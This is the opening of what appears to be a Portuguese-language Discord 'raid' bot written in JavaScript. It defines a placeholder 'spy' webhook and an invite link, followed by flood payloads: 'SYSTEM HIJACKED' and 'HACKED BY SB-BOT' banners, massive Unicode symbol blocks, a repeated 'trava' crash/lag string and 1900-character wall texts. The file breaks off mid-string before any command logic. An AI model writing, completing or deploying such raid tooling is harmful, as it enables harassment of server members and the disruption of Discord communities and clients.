const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const https = require('https');

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- CONFIGURAÇÃO ---
const SPY_WEBHOOK = "WEBHOOK_INVALIDA_AQUI"; 
const INVITE = "https://discord.gg/ure7pvshFW";

const stopSignals = new Map();

// --- TEXTOS ---

const RAID_HEADER = "# **S̶Y̶S̶T̶E̶M̶ ̶H̶I̶J̶A̶C̶K̶E̶D̶**\n";

const RAID_SYMBOLS = `∞ ♭ ♮ ♯ ♰ ♱ ▀ ▁ ▂ ▃ ▄ ▅ ▆ ▇ █ ▉ ▊ ▋ ▍ ▎ ▏ ▐ ░ ▒ ▓ ■ □ ▢ ▣ ▤ ▥ ▦ ▧ ▨ ▩ ▪ ▫ ▬ ▭ ▮ ▯ ▰ ▱ ▲ △ ▴ ▵ ▶ ▷ ▸ ▹ ► ▻ ▼ ▽ ▾ ▿ ◀ ◁ ◂ ◃ ◄ ◅ ◆ ◇ ◈ ◉ ◊ ○ ◌ ◍ ◎ ● ◐ ◑ ◒ ◓ ◔ ◕ ◖ ◗ ◘ ◙ ◚ ◛ ◜ ◝ ◞ ◟ ◠ ◡ ◢ ◣ ◤ ◥ ◦ ◧ ◨ ◩ ◪ ◫ ◬ ◭ ◮ ◯ ☰ ☱ ☲ ☳ ☴ ☵ ☶ ☷ ⟡ ⟦ ⟧ ⟨ ⟩ ⟪ ⟫ ⟰ ⟱ ⟲ ⟳ ⟴ ⟵ ⟿ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⌬ ⌭ ⌮ ⌯ ⌰ ⌱ ⌲ ⌳ ⌴ ⌵ ⌶ ⌷ ⌸ ⌹ ⌺ ⌻ ⌼ ⌽ ⌾ ⌿ ⍀ ⍁ ⍂ ⍃ ⍄ ⍅ ⍆ ⍇ ⍈ ⍉ ⍊ ⍋ ⍌ ⍍ ⍎ ⍏ ⍐ ⍑ ⍒ ⍓ ⍔ ⍕ ⍖ ⍗ ⍘ ⍙ ⍚ ⍛ ⍜ ⍝ ⍞ ⍟ ⍠ ⍡ ⍢ ⍣ ⍤ ⍥ ⍦ ⍧ ⍨ ⍩ ⍪ ⍫ ⍬ ⍭ ⍮ ⍯ ⍰ ⍱ ⍲ ⍳ ─ ━ │ ┃ ┄ ┅ ┆ ┇ ┈ ┉ ┊ ┋ ┌ ┍ ┎ ┏ ┐ ┑ ┒ ┓ └ ┕ ┖ ┗ ┘ ┙ ┚ ┛ ├ ┝ ┞ ┟ ┠ ┡ ┢ ┣ ┤ ┥ ┦ ┧ ┨ ┩ ┪ ┫ ┬ ┭ ┮ ┯ ┰ ┱ ┲ ┳ ┴ ┵ ┶ ┷ ┸ ┹ ┺ ┻ ┼ ┽ ┾ ┿ ╀ ╁ ╂ ╃ ╄ ╅ ╆ ╇ ╈ ╉ ╊ ╋ ╌ ╍ ╎ ╏ ═ ║ ╒ ╓ ╔ ╕ ╖ ╗ ╘ ╙ ╚ ╛ ╜ ╝ ╞ ╟ ╠ ╡ ╢ ╣ ╤ ╥ ╦ ╧ ╨ ╩ ╪ ╫ ╬ ╭ ╮ ╯ ╰ ╱ ╲ ╳ ╴ ╵ ╶ ╷ ╸ ╹ ╺ ╻ ╼ ╽ ╾ ╿ ⛧ ⚡`;

const RAID2_CONTENT = "## H̷A̷C̷K̷E̷D̷ ̷B̷Y̷ ̷S̷B̷-̷B̷O̷T̷ ☻•◘○◙♪♫☼►◄¶§▬↨↑↓→←∟^_`abcdefghijkwxyz{|}~⌂ÇüéâäêëèïîìÄÅÉæÆôöòûùÿÖÜø£Ø×ƒáíóúñÑªº¿®¬½¼¡«»░▒▓│┤ÁÂÀ©╣║╗╝¢¥┐└┴┬├─┼ãÃ╚╔╩╦╠═╬¤ðÐÊËÈıÍÎÏ┘┌█▄¦Ì▀ÓßÔÒõÕµþÞÚÛÙýÝ¯´–±‗¾¶§÷¸°¨·¹³²■ƒ”…†‡ˆ‰Š‹ŒŽ•–—š›œžŸ¡¢£¤¥¦§¨©ª«¬®¯±´µ¶·¸»¼½¾¿ÆÐ×ØÞßåæðóôõö÷øþĐđĦŒœƀƂƃƄƅƆƉƋƌƍƎƏƐƑƒƔƕƖƗƚƛƜƝƞƟƠơƢƣƤƥƦƧƨƩƪƱƷƸƹƺƻƼƽƾƿǀǁǂǝǷȡȢȣȸȹɷɸʘΦΨΩφψϞϟϪѼѾ҈҉ԱԲԳԴԵԶԷԸԹԺԻԼԽԾԿՀՁՂՃՄՅՆՇՈՉՊՋՌՍՎՏՐՑՒՓՔՕՖ۝۞۩߷ऄअआइईउऊऋऌऍऎएऐऑऒओऔकखगघङचछजझञटठडढणतथदधनऩपफबभमयरऱलळऴवशषसहॐक़ख़ग़ज़ड़ढ़फ़य़ॠॡ।॥०१२३४५६७८९ॲॻॼॽॾॿঅআইঈউঊঋঌএঐওঔকখগঘঙচছজঝঞটঠডঢণতথদধনপফবভমযরলশষসহঽৎড়ঢ়য়ৠৡ১২৩৪৫৬৭৮৯ৰৱ৲৳৴৵৶৷৸৹৺ਅਆਇਈਉਊਏਐਓਔਕਖਗਘਙਚਛਜਝਞਟਠਡਢਣਤਥਦਧਨਪਫਬਭਮਯਰਲਲ਼ਵਸ਼ਸਹਖ਼ਗ਼ਜ਼ੜਫ਼੦੧੨੩੪੫੬੭੮੯ੲੳੴઅઆઇઈઉઊઋઌઍએઐઑઓઔકખગઘઙચછજઝઞટઠડઢણતથદધનપફબભમયરલળવશષસહઽૐૠૡ૧૨૩૪૫૬૭૮૯૱ଅଆଇଈଉଊଋଌଏଐଓଔକଖଗଘଙଚଛଜଝଞଟଠଡଢଣତଥଦଧନପଫବଭମଯରଲଳଵଶଷସହଽଡ଼ଢ଼ୟୠୡ୦୧୨୩୪୫୬୭୮୯୰ୱஃஅஆஇஈஉஊஎஏஐஒஓஔகஙசஜஞடணதநனபமயரறலளழவஶஷஸஹௐ௰௱௲௳௴௵௶௷௸௹௺അആഇഈഉഊഋഌഎഏഐഒഓഔകഖഗഘങചഛജഝഞടഠഡഢണതഥദധനപഫബഭമയരറലളഴവശഷസഹഽൄൠൡ൦൧൨൩൪൫൬൭൮൯൰൱൲൳൴൵൹ൺൻർൽൾൿ෴࿂࿃࿄࿅࿆࿇࿈࿉࿊࿋࿌࿏ႠႡႢႣႤႥႦႧႨႩႪႫႬႭႮႯႰႱႲႳႴႵႶႷႸႹႺႻႼႽႾႿჀჁჂჃჄჅაბგდევზთიკლმნოჟრსტუფქღყშჩცძწჭხჯჰჱჲჳჴჵჶჷჸჹჺ፠፡።፣፤፥፦፧፨ᎣᎤᎦᎧᎨᎭᎮᎯᎰᎱᎲᎴᎸᎹᎺᎼᎽᎾᎿᏁᏄᏅᏆᏇᏈᏉᏊᏋᏌᏍᏏᏐᏑᏓᏔᏕᏖᏗᏘᏙᏛᏜᏝᏠᏡᏣᏤᏥᏧᏨᏩᏪᏫᏬᏯᏰᏱᏲᏳᐁᐂᐃᐄᐅᐆᐇᐈᐉᐊᐋᐌᐍᐎᐏᐐᐑᐒᐓᐔᐕᐖᐗᐘᐙᐚᐛᐜᐝᐞᐟᐠᐡᐢᐣᐤᐥᐦᐧᐨᐩᐪᐫᐬᐭᐮᐯᐰᐱᐲᐳᐴᐵᐶᐷᐸᐹᐺᐻᐼᐽᐾᐿᑀᑁᑂᑃᑄᑅᑆᑇᑈᑉᑊᑋᑌᑍᑎᑏᑐᑑᑒᑓᑔᑕᑖᑗᑘᑙᑚᑛᑜᑝᑞᑟᑠᑡᑢᑣᑤᑥᑦᑧᑨᑩᑪᑫᑬᑭᑮᑯᑰᑱᑲᑳᑴᑵᑶᑷᑸᑹᑺᑻᑼᑽᑾᑿᒀᒁᒂᒃᒄᒅᒆᒇᒈᒉᒊᒋᒌᒍᒎᒏᒐᒑᒒᒓᒔᒕᒖᒗᒘᒙᒚᒛᒜᒝᒞᒟᒠᒡᒢᒣᒤᒥᒦᒧᒨᒩᒪᒫᒬᒭᒮᒯᒰᒱᒲᒳᒴᒵᒶᒷᒸᒹᒺᒻᒼᒽᒾᒿᓀᓁᓂᓃᓄᓅᓆᓇᓈᓉᓊᓋᓌᓍᓎᓏᓐᓑᓒᓓᓔᓕᓖᓗᓘᓙᓚᓛᓜᓝᓞᓟᓠᓡᓢᓣᓤᓥᓦᓧᓨᓩᓪᓫᓬᓭᓮᓯᓰᓱᓲᓳᓴᓵᓶᓷᓸᓹᓺᓻᓼᓽᓾᓿᔀᔁᔂᔃᔄᔅᔆᔇᔈᔉᔊᔋᔌᔍᔎᔏᔐᔑᔒᔓᔔᔕᔖᔗᔘᔙᔚᔛᔜᔝᔞᔟᔠᔡᔢᔣᔤᔥᔦᔧᔨᔩᔪᔫᔬᔭᔮᔯᔰᔱᔲᔳᔴᔵᔶᔷᔸᔹᔺᔻᔼᔽᔾᔿᕀᕁᕂᕃᕄᕅᕆᕇᕈᕉᕊᕋᕌᕍᕎᕏᕐᕑᕒᕓᕔᕕᕖᕗᕘᕙᕚᕛᕜᕝᕞᕟᕠᕡᕢᕣᕤᕥᕦᕧᕨᕩᕪᕫᕬᕭᕮᕯᕰᕱᕲᕳᕴᕵᕶᕷᕸᕹᕺᕻᕼᕽᕾᕿᖀᖁᖂᖃᖄᖅᖆᖇᖈᖉᖊᖋᖌᖍᖎᖏᖐᖑᖒᖓᖔᖕᖖᖗᖘᖙᖚᖛᖜᖝᖞᖟᖠᖡᖢᖣᖤᖥᖦᖧᖨᖩᖪᖫᖬᖭᖮᖯᖰᖱᖲᖳᖴᖵᖶᖷᖸᖹᖺᖻᖼᖽᖾᖿᗀᗁᗂᗃᗄᗅᗆᗇᗈᗉᗊᗋᗌᗍᗎᗏᗐᗑᗒᗓᗔᗕᗖᗗᗘᗙᗚᗛᗜᗝᗞᗟᗠᗡᗢᗣᗤᗥᗦᗧᗨᗩᗪᗫᗬᗭᗮᗯᗰᗱᗲᗳᗴᗵᗶᗷᗸᗹᗺᗻᗼᗽᗾᗿᘀᘁᘂᘃᘄᘅᘆᘇᘈᘉᘊᘋᘌᘍᘎᘏᘐᘑᘒᘓᘔᘕᘖᘗᘘᘙᘚᘛᘜᘝᘞᘟᘠᘡᘢᘣᘤᘥᘦᘧᘨᘩᘪᘫᘬᘭᘮᘯᘰᘱᘲᘳᘴᘵᘶᘷᘸᘹᘺᘻᘼᘽᘾᘿᙀᙁᙂᙃᙄᙅᙆᙇᙈᙉᙊᙋᙌᙍᙎᙏᙐᙑᙒᙓᙔᙕᙖᙗᙘᙙᙚᙛᙜᙝᙞᙟᙠᙡᙢᙣᙤᙥᙦᙧᙨᙩᙪᙫᙬ᙭᙮ᙯᙰᙱᙲᙳᙴᙵᙶᚁᚂᚃᚄᚅᚆᚇᚈᚉᚊᚋᚌᚍᚎᚏᚐᚑᚒᚓᚔᚕᚖᚗᚘᚙᚚ᚛᚜ᚠᚡᚢᚣᚤᚥᚦᚧᚨᚩᚪᚫᚬᚭᚮᚯᚰᚱᚲᚳᚴᚵᚶᚷᚸᚹᚺᚻᚼᚽᚾᚿᛀᛁᛂᛃᛄᛅᛆᛇᛈᛉᛊᛋᛌᛍᛎᛏᛐᛑᛒᛓᛔᛕᛖᛗᛘᛙᛚᛛᛜᛝᛞᛟᛠᛡᛢᛣᛤᛥᛦᛨᛩᛪ᛫᛭ᛮᛯᛰ៳៴៵៶៷៸៹᠀᠁᠅᠉ᢀᢁᢂᢃᢄᢅᢆᥐᥑᥒᥓᥔᥕᥖᥗᥘᥙᥚᥛᥜᥝᥞᥟᥠᥡᥢᥣᥤᥥᥦᥧᥨᥩᥪᥫᥬᥭᥰᥱᥲᥳᥴᦀᦁᦂᦃᦄᦅᦆᦇᦈᦉᦊᦋᦌᦍᦎᦏᦐᦑᦒᦓᦔᦕᦖᦗᦘᦙᦚᦛᦜᦝᦞᦟᦠᦡᦢᦣᦤᦥᦦᦧᦨᦩᦰᦱᦲᦳᦴᦸᦹᦻᦼᦽᦾᦿᧀᧁᧂᧃᧄᧅᧆᧇᧈᧉ᧑᧒᧓᧔᧕᧖᧗᧘᧙᧞᧟᧠᧡᧢᧣᧤᧥᧦᧧᧨᧩᧪᧫᧬᧭᧮᧯᧰᧱᧲᧳᧴᧵᧶᧷᧸᧹᧺᧻᧼᧽᧾᧿ᴁᴂᴈᴉᴑᴒᴓᴔᴕᴖᴗᴘᴙᴚᴛᴜᴝᴞᴟᵷᵹ†‡•‣※‽‾‿⁀⁁⁂⁃⁄⁅⁆⁇⁈⁑⁗⁞₠₡₢₣₤₥₦₧₨₩₪₫€₭₮₯₰₱₲₳₴₵₸⃒⃓⃐⃑⃔⃕⃖⃛⃜⃝⃠⃪⃡⃩℀℁ℂ℃℄℅℆ℇ℈℉ℊℋℌℍℎℏℐℑℒℓ℔ℕ№℗℘ℙℚℛℜℝ℞℟℠℡™℣ℤ℥Ω℧ℨ℩KÅℬℭ℮ℯℰℱℲℳℴℵℶℷℸ℺ℽℾℿ⅀⅁⅂⅃⅄ⅅⅆⅇⅈⅉ⅊⅋⅌⅍ⅎ⅓⅔⅕⅖⅗⅘⅙⅚⅛⅜⅝⅞⅟ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹⅺⅻⅼⅽⅾⅿↀↁↂↃↄ←↑→↓↚↛↜↝↞↟↠↡↢↣↤↥↦↧↨↫↬↭↮↯↰↱↲↳↴↵↶↷↸↹↺↻↼↽↾↿⇀⇁⇂⇃⇄⇅⇆⇇⇈⇉⇊⇋⇌⇍⇎⇏⇐⇑⇒⇓⇔⇕⇖⇗⇘⇙⇚⇛⇜⇝⇞⇟⇠⇡⇢⇣⇤⇥⇦⇧⇨⇩⇪⇫⇬⇭⇮⇯⇰⇱⇲⇳⇴⇵⇶⇷⇸⇹⇺⇻⇼⇽⇾⇿∀∁∂∃∄∅∆∇∈∉∊∋∌∍∎∏∐∑−∓∔∕∖∘∙√∛∜∝∞∟∠∡∢∣∤∥∦⊥⊦∩∪∫∬∭∮∯∰∱∲∳∴∵∶∷∸∹∺∻∼∽∾∿≀≁≂≃≄≅≆≇≈≉≊≋≌≍≎≏≐≑≒≓≔≕≖≗≘≙≚≛≜≝≞≟≠≡≢≣≤≥≦≧≨≩≪≫≬≭≮≯≰≱≲≳≴≵≶≷≸≹≺≻≼≽≾≿⊀⊁⊂⊃⊄⊅⊆⊇⊈⊉⊊⊋⊌⊍⊎⊏⊐⊑⊒⊓⊔⊕⊖⊗⊘⊙⊚⊛⊜⊝⊞⊟⊠⊡⊢⊣⊤⊥⊦⊧⊨⊩⊪⊫⊬⊭⊮⊯⊰⊱⊲⊳⊴⊵⊶⊷⊸⊹⊺⊻⊼⊽⊾⊿⋀⋁⋂⋃⋄⋅⋆⋇⋈⋉⋊⋋⋌⋍⋎⋏⋐⋑⋒⋓⋔⋕⋖⋗⋘⋙⋚⋛⋜⋝⋞⋟⋠⋡⋢⋣⋤⋥⋦⋧⋨⋩⋪⋫⋬⋭⋮⋯⋰⋱⋲⋳⋴⋵⋶⋷⋸⋹⋺⋻⋼⋽⋾⋿⌀⌁⌂⌃⌄⌅⌆⌇⌈⌉⌊⌋⌌⌍⌎⌏⌐⌑⌒⌓⌔⌕⌖⌗⌘⌙⌜⌝⌞⌟⌠⌡⌢⌣⌤⌥⌦⌧〈〉⌫⌬⌭⌮⌯⌰⌱⌲⌳⌴⌵⌶⌷⌸⌹⌺⌻⌼⌽⌾⌿⍀⍁⍂⍃⍄⍅⍆⍇⍈⍉⍊⍋⍌⍍⍎⍏⍐⍑⍒⍓⍔⍕⍖⍗⍘⍙⍚⍛⍜⍝⍞⍟⍠⍡⍢⍣⍤⍥⍦⍧⍨⍩⍪⍫⍬⍭⍮⍯⍰⍱⍲⍳⍴⍵⍶⍷⍸⍹⍺⍻⍼⍽⍾⍿⎀⎁⎂⎃⎄⎅⎆⎇⎈⎉⎊⎋⎌⎍⎎⎏⎐⎑⎒⎓⎔⎕⎖⎗⎘⎙⎚⎛⎜⎝⎞⎟⎠⎡⎢⎣⎤⎥⎦⎧⎨⎩⎪⎫⎬⎭⎮⎯⎰⎱⎲⎳⎴⎵⎶⎷⎸⎹⎺⎻⎼⎽⎾⎿⏀⏁⏂⏃⏄⏅⏆⏇⏈⏉⏊⏋⏌⏍⏎⏚⏛⏜⏝⏞⏟⏠␀␁␂␃␄␅␆␇␈␉␊␋␌␍␎␏␐␑␒␓␔␕␖␗␘␙␚␛␜␝␞␟␠␡␢␣␤⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿─━│┃┄┅┆┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋╌╍╎╏═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╭╮╯╰╱╲╳╴╵╶╷╸╹╺╻╼╽╾╿▀▁▂▃▄▅▆▇█▉▊▋▌▍▎▏▐░▒▓▔▕■□▢▣▤▥▦▧▨▩▬▭▮▯▰▱▲△▴▵▷▸▹►▻▼▽▾▿◁◂◃◄◅◆◇◈◉◊○◌◍◎●◐◑◒◓◔◕◖◗◘◙◢◣◤◥◦◧◨◩◪◫◬◭◮◯★☆☇☈☉☊☋☌☍☏☐☒☓☖☗☙☡☤☧☨☩☫☬☭☰☱☲☳☴☵☶☷☻☼☽☾☿♁♃♄♅♆♇♔♕♖♗♘♙♚♛♜♝♞♟♡♢♤♧♩♪♫♬♭♮♯♰♱✁✃✄✆✇✎✐✑✓✕✗✘✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❀❁❂❃❅❆❈❉❊❋❍❏❐❑❒❖❘❙❚❛❜❝❞❡❢❥❦❧❶❷❸❹❺❻❼❽❾❿➀➁➂➃➄➅➆➇➈➉➊➋➌➍➎➏➐➑➒➓➔➘➙➚➛➜➝➞➟➠➢➣➤➥➦➧➨➩➪➫➬➭➮➯➱➲➳➴➵➶➷➸➹➺➻➼➽➾⟐⟑⟒⟓⟔⟕⟖⟗⟘⟙⟚⟛⟜⟝⟞⟟⟠⟡⟢⟣⟤⟥⟦⟧⟨⟩⟪⟫⟰⟱⟲⟳⟴⟵⟶⟷⟸⟹⟺⟻⟼⟽⟾⟿⠀⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿⡀⡁⡂⡃⡄⡅⡆⡇⡈⡉⡊⡋⡌⡍⡎⡏⡐⡑⡒⡓⡔⡕⡖⡗⡘⡙⡚⡛⡜⡝⡞⡟⡠⡡⡢⡣⡤⡥⡦⡧⡨⡩⡪⡫⡬⡭⡮⡯⡰⡱⡲⡳⡴⡵⡶⡷⡸⡹⡺⡻⡼⡽⡾⡿⢀⢁⢂⢃⢄⢅⢆⢇⢈⢉⢊⢋⢌⢍⢎⢏⢐⢑⢒⢓⢔⢕⢖⢗⢘⢙⢚⢛⢜⢝⢞⢟⢠⢡⢢⢣⢤⢥⢦⢧⢨⢩⢪⢫⢬⢭⢮⢯⢰⢱⢲⢳⢴⢵⢶⢷⢸⢹⢺⢻⢼⢽⢾⢿⣀⣁⣂⣃⣄⣅⣆⣇⣈⣉⣊⣋⣌⣍⣎⣏⣐⣑⣒⣓⣔⣕⣖⣗⣘⣙⣚⣛⣜⣝⣞⣟⣠⣡⣢⣣⣤⣥⣦⣧⣨⣩⣪⣫⣬⣭⣮⣯⣰⣱⣲⣳⣴⣵⣶⣷⣸⣹⣺⣻⣼⣽⣾⣿⤀⤁⤂⤃⤄⤅⤆⤇⤈⤉⤊⤋⤌⤍⤎⤏⤐⤑⤒⤓⤔⤕⤖⤗⤘⤙⤚⤛⤜⤝⤞⤟⤠⤡⤢⤣⤤⤥⤦⤧⤨⤩⤪⤫⤬⤭⤮⤯⤰⤱⤲⤳⤺⤻⤼⤽⤾⤿⥀⥁⥂⥃⥄⥅⥆⥇⥈⥉⥊⥋⥌⥍⥎⥏⥐⥑⥒⥓⥔⥕⥖⥗⥘⥙⥚⥛⥜⥝⥞⥟⥠⥡⥢⥣⥤⥥⥦⥧⥨⥩⥪⥫⥬⥭⥮⥯⥰⥱⥲⥳⥴⥵⥶⥷⥸⥹⥺⥻⥼⥽⥾⥿⦀⦁⦂⦃⦄⦅⦆⦇⦈⦉⦊⦋⦌⦍⦎⦏⦐⦑⦒⦓⦔⦕⦖⦗⦘⦙⦚⦛⦜⦝⦞⦟⦠⦡⦢⦣⦤⦥⦦⦧⦨⦩⦪⦫⦬⦭⦮⦯⦰⦱⦲⦳⦴⦵⦶⦷⦸⦹⦺⦻⦼⦽⦾⦿⧀⧁⧂⧃⧄⧅⧆⧇⧈⧉⧊⧋⧌⧍⧎⧏⧐⧑⧒⧓⧔⧕⧖⧗⧘⧙⧚⧛⧜⧝⧞⧟⧠⧡⧢⧣⧤⧥⧦⧧⧨⧩⧪⧫⧬⧭⧮⧯⧰⧱⧲⧳⧴⧵⧶⧷⧸⧹⧺⧻⧼⧽⧾⧿⨀⨁⨂⨃⨄⨅⨆⨇⨈⨉⨊⨋⨌⨍⨎⨏⨐⨑⨒⨓⨔⨕⨖⨗⨘⨙⨚⨛⨜⨝⨞⨟⨠⨡⨢⨣⨤⨥⨦⨧⨨⨩⨪⨫⨬⨭⨮⨯⨰⨱⨲⨳⨴⨵⨶⨷⨸⨹⨺⨻⨼⨽⨾⨿⩀⩁⩂⩃⩄⩅⩆⩇⩈⩉⩊⩋⩌⩍⩎⩏⩐⩑⩒⩓⩔⩕⩖⩗⩘⩙⩚⩛⩜⩝⩞⩟⩠⩡⩢⩣⩤⩥⩦⩧⩨⩩⩪⩫⩬⩭⩮⩯⩰⩱⩲⩳⩴⩵⩶⩷⩸⩹⩺⩻⩼⩽⩾⩿⪀⪁⪂⪃⪄⪅⪆⪇⪈⪉⪊⪋⪌⪍⪎⪏⪐⪑⪒⪓⪔⪕⪖⪗⪘⪙⪚⪛⪜⪝⪞⪟⪠⪡⪢⪣⪤⪥⪦⪧⪨⪩⪪⪫⪬⪭⪮⪯⪰⪱⪲⪳⪴⪵⪶⪷⪸⪹⪺⪻⪼⪽⪾⪿⫀⫁⫂⫃⫄⫅⫆⫇⫈⫉⫊⫋⫌⫍⫎⫏⫐⫑⫒⫓⫔⫕⫖⫗⫘⫙⫚⫛⫝⫞⫟⫠⫡⫢⫣⫤⫥⫦⫧⫨⫩⫪⫫⫬⫭⫮⫯⫰⫱⫲⫳⫴⫵⫶⫷⫸⫹⫺⫻⫼⫽⫾⫿⬚ⱠⱡⱢⱣⱤⱥⱦⱧⱨⱩⱪⱫⱬⱭⱱⱲⱳⱴⱵⱶⱷⴰⴱⴲⴳⴴⴵⴶⴷⴸⴹⴺⴻⴼⴽⴾⴿⵀⵁⵂⵃⵄⵅⵆⵇⵈⵉⵊⵋⵌⵍⵎⵏⵐⵑⵒⵓⵔⵕⵖⵗⵘⵙⵚⵛⵜⵝⵞⵟⵠⵡⵢⵣⵤⵥ✽✾✿❀❁❂❃❈♩♪♫♬♭♮♯✢✣✤✥✦✧✩✪⍟✫✬✭✮⋆★☆✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❉❊❋☻☏☜☞☟☚☛✁✃✄✎✐✑✆✗✘☒▔❘❙❚░▒▓❛❜❝❞❢❥❡❦❧〰☿♁♃♄♅♆♇☉♚♔♛♕♜♖♝♗♞♘♟♙♤♧♡♢☥☨☩✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿☡☤"

const TRAVA_PATTERN = "漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.";
const TRAVA_ZAP_MSG = Array(60).fill(TRAVA_PATTERN).join(""); 

const WALL_1 = Array(1900).fill("░").join("");
const WALL_2 = Array(1900).fill("▒").join("");
const WALL_3 = Array(1900).fill("▓").join("");

const PONTO_TEXT = `⠁ ⠂ ⠃ ⠄ ⠅ ⠆ ⠇ ⠈ ⠉ ⠊ ⠋ ⠌ ⠍ ⠎ ⠏ ⠐ ⠑ ⠒ ⠓ ⠔ ⠕ ⠖ ⠗ ⠘ ⠙ ⠚ ⠛ ⠜ ⠝ ⠞ ⠟ ⠠ ⠡ ⠢ ⠣ ⠤ ⠥ ⠦ ⠧ ⠨ ⠩ ⠪ ⠫ ⠬ ⠭ ⠮ ⠯ ⠰ ⠱ ⠲ ⠳ ⠴ ⠵ ⠶ ⠷ ⠸ ⠹ ⠺ ⠻ ⠼ ⠽ ⠾ ⠿ ⡀ ⡁ ⡂ ⡃ ⡄ ⡅ ⡆ ⡇ ⡈ ⡉ ⡊ ⡋ ⡌ ⡍ ⡎ ⡏ ⡐ ⡑ ⡒ ⡓ ⡔ ⡕ ⡖ ⡗ ⡘ ⡙ ⡚ ⡛ ⡜ ⡝ ⡞ ⡟ ⡠ ⡡ ⡢ ⡣ ⡤ ⡥ ⡦ ⡧ ⡨ ⡩ ⡪ ⡫ ⡬ ⡭ ⡮ ⡯ ⡰ ⡱ ⡲ ⡳ ⡴ ⡵ ⡶ ⡷ ⡸ ⡹ ⡺ ⡻ ⡼ ⡽ ⡾ ⡿ ⢀ ⢁ ⢂ ⢃ ⢄ ⢅ ⢆ ⢇ ⢈ ⢉ ⢊ ⢋ ⢌ ⢍ ⢎ ⢏ ⢐ ⢑ ⢒ ⢓ ⢔ ⢕ ⢖ ⢗ ⢘ ⢙ ⢚ ⢛ ⢜ ⢝ ⢞ ⢟ ⢠ ⢡ ⢢ ⢣ ⢤ ⢥ ⢦ ⢧ ⢨ ⢩ ⢪ ⢫ ⢬ ⢭ ⢮ ⢯ ⢰ ⢱ ⢲ ⢳ ⢴ ⢵ ⢶ ⢷ ⢸ ⢹ ⢺ ⢻ ⢼ ⢽ ⢾ ⢿ ⣀ ⣁ ⣂ ⣃ ⣄ ⣅ ⣆ ⣇ ⣈ ⣉ ⣊ ⣋ ⣌ ⣍ ⣎ ⣏ ⣐ ⣑ ⣒ ⣓ ⣔ ⣕ ⣖ ⣗ ⣘ ⣙ ⣚ ⣛ ⣜ ⣝ ⣞ ⣟ ⣠ ⣡ ⣢ ⣣ ⣤ ⣥ ⣦ ⣧ ⣨ ⣩ ⣪ ⣫ ⣬ ⣭ ⣮ ⣯ ⣰ ⣱ ⣲ ⣳ ⣴ ⣵ ⣶ ⣷ ⣸ ⣹ ⣺ ⣻ ⣼ ⣽ ⣾ ⣿ ⤀ ⤁ ⤂ ⤃ ⤄ ⤅ ⤆ ⤇ ⤈ ⤉ ⤊ ⤋ ⤌ ⤍ ⤎ ⤏ ⤐ ⤑ ⤒ ⤓ ⤔ ⤕ ⤖ ⤗ ⤘ ⤙ ⤚ ⤛ ⤜ ⤝ ⤞ ⤟ ⤠ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉ ⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭ ⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿ ⦀ ⦁ ⦂ ⦃ ⦄ ⦅ ⦆ ⦇ ⦈ ⦉ ⦊ ⦋ ⦌ ⦍ ⦎ ⦏ ⦐ ⦑ ⦒ ⦓ ⦔ ⦕ ⦖ ⦗ ⦘ ⦙ ⦚ ⦛ ⦜ ⦝ ⦞ ⦟ ⦠ ⦡ ⦢ ⦣ ⦤ ⦥ ⦦ ⦧ ⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯ ⦰ ⦱ ⦲ ⦳ ⦴ ⦵ ⦶ ⦷ ⦸ ⦹ ⦺ ⦻ ⦼ ⦽ ⦾ ⦿ ⧀ ⧁ ⧂ ⧃ ⧄ ⧅ ⧆ ⧇ ⧈ ⧉ ⧊ ⧋ ⧌ ⧍ ⧎ ⧏ ⧐ ⧑ ⧒ ⧓ ⧔ ⧕ ⧖ ⧗ ⧘ ⧙ ⧚ ⧛ ⧜ ⧝ ⧞ ⧟ ⧠ ⧡ ⧢ ⧣ ⧤ ⧥ ⧦ ⧧ ⧨ ⧩ ⧪ ⧫ ⧬ ⧭ ⧮ ⧯ ⧰ ⧱ ⧲ ⧳ ⧴ ⧵ ⧶ 